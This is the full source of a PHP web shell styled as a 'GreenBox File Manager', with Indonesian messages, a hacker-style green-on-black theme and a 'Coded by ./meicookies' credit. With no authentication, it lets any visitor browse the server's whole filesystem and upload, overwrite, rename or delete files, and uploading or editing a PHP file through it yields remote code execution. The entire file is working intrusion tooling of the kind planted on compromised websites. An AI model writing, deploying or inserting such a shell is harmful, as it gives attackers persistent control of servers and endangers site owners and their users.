<?php
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$currentDir || !is_dir($currentDir)) {
    $currentDir = getcwd();
}

function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB');
    for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, 2) . ' ' . $units[$i];
}

$action = $_POST['action'] ?? $_GET['action'] ?? '';
$message = '';

if ($action === 'upload' && isset($_FILES['file'])) {
    $uploadPath = $currentDir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        $message = 'Upload berhasil: ' . basename($_FILES['file']['name']);
    } else {
        $message = 'Upload gagal!';
    }
} elseif ($action === 'delete' && isset($_GET['item'])) {
    $itemPath = $currentDir . '/' . $_GET['item'];
    if (is_file($itemPath)) {
        if (unlink($itemPath)) {
            $message = 'File dihapus: ' . basename($_GET['item']);
        } else {
            $message = 'Gagal hapus file!';
        }
    } elseif (is_dir($itemPath)) {
        if (@rmdir($itemPath)) {
            $message = 'Direktori dihapus: ' . basename($_GET['item']);
        } else {
            $message = 'Gagal hapus direktori! (Kosongkan dulu isinya)';
        }
    }
} elseif ($action === 'rename' && isset($_POST['oldname']) && isset($_POST['newname'])) {
    $oldPath = $currentDir . '/' . $_POST['oldname'];
    $newPath = $currentDir . '/' . $_POST['newname'];
    if (rename($oldPath, $newPath)) {
        $message = 'Berhasil rename: ' . htmlspecialchars($_POST['oldname']) . ' → ' . htmlspecialchars($_POST['newname']);
    } else {
        $message = 'Gagal rename file/direktori!';
    }
} elseif ($action === 'edit' && isset($_POST['filename'])) {
    $filePath = $currentDir . '/' . $_POST['filename'];
    file_put_contents($filePath, $_POST['content']);
    $message = 'File disimpan: ' . htmlspecialchars($_POST['filename']);
}

$items = scandir($currentDir);
sort($items);
?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>GreenBox</title>
<style>
body {
    font-family: 'Courier New', monospace;
    background: #000;
    color: #00ff00;
    margin: 20px;
}
h1 {
    color: #00ff00;
    text-shadow: 0 0 5px #00ff00;
    border-bottom: 1px solid #00ff00;
    padding-bottom: 10px;
}
a { color: inherit; text-decoration: none; }
.item {
    background: #111;
    padding: 8px;
    margin: 5px 0;
    display: flex;
    justify-content: space-between;
    box-shadow: 0 0 4px rgba(0,255,0,0.3);
}
.message {
    background: #111;
    padding: 5px;
    border-left: 3px solid #00ff00;
    margin-bottom: 10px;
}
form { margin-top: 10px; }
input, textarea {
    background: #000;
    color: #00ff00;
    border: 1px solid #00ff00;
    font-family: 'Courier New', monospace;
    width: 100%;
}
button {
    background: #000;
    color: #00ff00;
    border: 1px solid #00ff00;
    padding: 3px 8px;
    margin-left: 5px;
    cursor: pointer;
}
textarea { width: 100%; height: 300px; margin-top: 10px; }
</style>
</head>
<body>
<h1>GreenBox File Manager</h1>
<div class="message"><?= htmlspecialchars($message) ?></div>

<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="action" value="upload">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

<p><b>Current dir:</b> <?= htmlspecialchars($currentDir) ?></p>

<?php
if (basename($currentDir) !== '') {
    $parent = dirname($currentDir);
    echo '<a href="?dir=' . urlencode($parent) . '" class="item">⬆️ Kembali</a>';
}

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $path = $currentDir . '/' . $item;
    echo '<div class="item">';
    if (is_dir($path)) {
        echo '<a class="dir" href="?dir=' . urlencode($path) . '">' . htmlspecialchars($item) . '/</a>';
    } else {
        echo '<span class="file">' . htmlspecialchars($item) . ' (' . formatSize(filesize($path)) . ')</span>';
    }
    echo '<span>';
    if (is_file($path)) {
        echo '<a href="?dir=' . urlencode($currentDir) . '&action=editform&item=' . urlencode($item) . '"><button>Edit</button></a>';
    }
    echo '<a href="?dir=' . urlencode($currentDir) . '&action=renameform&item=' . urlencode($item) . '"><button>Rename</button></a>';
    echo '<a href="?dir=' . urlencode($currentDir) . '&action=delete&item=' . urlencode($item) . '" onclick="return confirm(\'Hapus ' . $item . '?\')"><button>Delete</button></a>';
    echo '</span></div>';
}

// FORM EDIT FILE
if ($action === 'editform' && isset($_GET['item'])) {
    $filePath = $currentDir . '/' . $_GET['item'];
    if (is_file($filePath)) {
        $content = htmlspecialchars(file_get_contents($filePath));
        echo '<h2>Edit: ' . htmlspecialchars($_GET['item']) . '</h2>';
        echo '<form method="post">';
        echo '<input type="hidden" name="action" value="edit">';
        echo '<input type="hidden" name="filename" value="' . htmlspecialchars($_GET['item']) . '">';
        echo '<textarea name="content">' . $content . '</textarea>';
        echo '<br><input type="submit" value="Simpan">';
        echo '</form>';
    }
}

// FORM RENAME
if ($action === 'renameform' && isset($_GET['item'])) {
    echo '<h2>Rename: ' . htmlspecialchars($_GET['item']) . '</h2>';
    echo '<form method="post">';
    echo '<input type="hidden" name="action" value="rename">';
    echo '<input type="hidden" name="oldname" value="' . htmlspecialchars($_GET['item']) . '">';
    echo '<input type="text" name="newname" value="' . htmlspecialchars($_GET['item']) . '">';
    echo '<input type="submit" value="Ganti Nama">';
    echo '</form>';
}
?>
<p><small>Coded by ./meicookies</small></p>
</body>
</html>
